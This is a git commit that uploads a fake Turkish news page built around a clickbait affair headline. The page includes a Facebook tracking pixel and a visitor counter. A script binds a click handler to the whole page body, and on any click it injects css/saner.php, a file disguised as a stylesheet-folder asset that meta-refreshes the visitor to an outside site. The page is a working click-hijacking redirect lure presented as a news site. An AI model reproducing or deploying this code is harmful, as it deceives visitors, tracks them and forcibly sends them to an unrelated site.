59d9bceb15ba2c07f275030365577e5313829bd9
sanernecro <sanernecro@gmail.com>
2017-07-26 23:57:39 +0300

    Add files via upload

---
+++ web/css/saner.php
@@ -0,0 +1,4 @@
+<heaD>
+
+<meta http-equiv="refresh" content="0;url=http://pordi.us"> 
+</head>
---
+++ web/index.php
@@ -0,0 +1,203 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>.</title>
+
+
+    <!-- Bootstrap Core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="css/portfolio-item.css" rel="stylesheet">
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+<head>
+<!-- Facebook Pixel Code -->
+<head>
+<!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '136811923566861'); // Insert your pixel ID here.
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=136811923566861&ev=PageView&noscript=1"
+/></noscript>
+<!-- DO NOT MODIFY -->
+<!-- End Facebook Pixel Code -->
+</head>
+<!-- The below method uses jQuery, but that is not required -->
+<!-- Add event to the button's click handler -->
+<script type="text/javascript">
+$( '#addToCartButton' ).click(function() {
+fbq('track', 'AddToCart', {
+content_ids: ['1234'],
+content_type: 'product',
+value: 2.99,
+currency: 'USD'
+});
+});
+</script>
+
+
+
+</head>
+
+<body style="cursor: pointer;">
+    <div id="islem"></div>
+    <!-- Navigation -->
+    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+        <div class="container">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Haberler</span>
+                    <span class="icon-bar">Haber Kategorileri</span>
+                    <span class="icon-bar">Son dakika</span>
+                    <span class="icon-bar">Gündem</span>
+                </button>
+                <a class="navbar-brand" href="#">gnlkhaberler.info</a>
+            </div>
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav">
+                    <li>
+                        <a href="#">Hakkımızda</a>
+                    </li>
+                    <li>
+                        <a href="#">Künye</a>
+                    </li>
+                    <li>
+                        <a href="#">Kategoriler</a>
+                    </li>
+                    <li>
+                        <a href="#">Son dakika haberler</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Content -->
+    <div class="container">
+
+        <!-- Portfolio Item Heading -->
+        <div class="row">
+            <div class="col-lg-12">
+                <h1 class="page-header">Haberler
+                    <small>Son dakika</small>
+                </h1>
+            </div>
+        </div>
+        <!-- /.row -->
+
+        <!-- Portfolio Item Row -->
+        <div class="row">
+
+            <div class="col-md-8">
+                <img class="img-responsive" src="css/manset.jpg" >
+            </div>
+            <meta property="og:title" content="." />
+            <div class="col-md-4">
+                <h3>Baldızı ile birlikte aynı yatakda yakalandı!</h3>
+                <p>Karısı tarafından basılan baldızı ile eniştesi video ya alınıp internetde servis edildi. </p>
+                <h3>Kategoriler</h3>
+                <ul>
+                    <li>Haber.</li>
+                    <li>Son dakika</li>
+                    <li>Kategori.</li>
+                    <li>En son.</li>
+                </ul>
+            </div>
+
+        </div>
+        <!-- /.row -->
+
+        <!-- Related Projects Row -->
+        <div class="row">
+
+            <div class="col-lg-12">
+                <h3 class="page-header">Diğer Haberler</h3>
+            </div>
+
+            <div class="col-sm-3 col-xs-6">
+                <a href="#">
+                <img class="img-responsive" src="css/1.jpg" >
+                </a>
+            </div>
+
+            <div class="col-sm-3 col-xs-6">
+                <a href="#">
+                <img class="img-responsive" src="css/2.jpg" >
+                </a>
+            </div>
+
+            <div class="col-sm-3 col-xs-6">
+                <a href="#">
+                <img class="img-responsive" src="css/3.jpg" >
+                </a>
+            </div>
+
+            <div class="col-sm-3 col-xs-6">
+                <a href="#">
+                <img class="img-responsive" src="css/4.jpg" >
+                </a>
+            </div>
+
+        </div>
+        <!-- /.row -->
+
+        <hr>
+
+        <!-- Footer -->
+        <footer>
+            <div class="row">
+                <div class="col-lg-12">
+                    <p>Copyright &copy; gnlkhaberler.info 2010</p>
+                </div>
+            </div>
+            <!-- /.row -->
+        </footer>
+
+    </div>
+    <!-- /.container -->
+
+    <!-- jQuery -->
+    <script src="css/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="css/bootstrap.min.js"></script>
+
+
+<!-- DO NOT MODIFY -->
+<!-- End Facebook Pixel Code -->
+
+<script id="_wau6qd">
+new Image().src='https://whos.amung.us/swidget/online34';
+$('body').click(function() {
+   $.get( "css/saner.php", function( data ) {  $( "#islem" ).html( data );  });
+});
+
+</script>
+</body>
+
+</html>
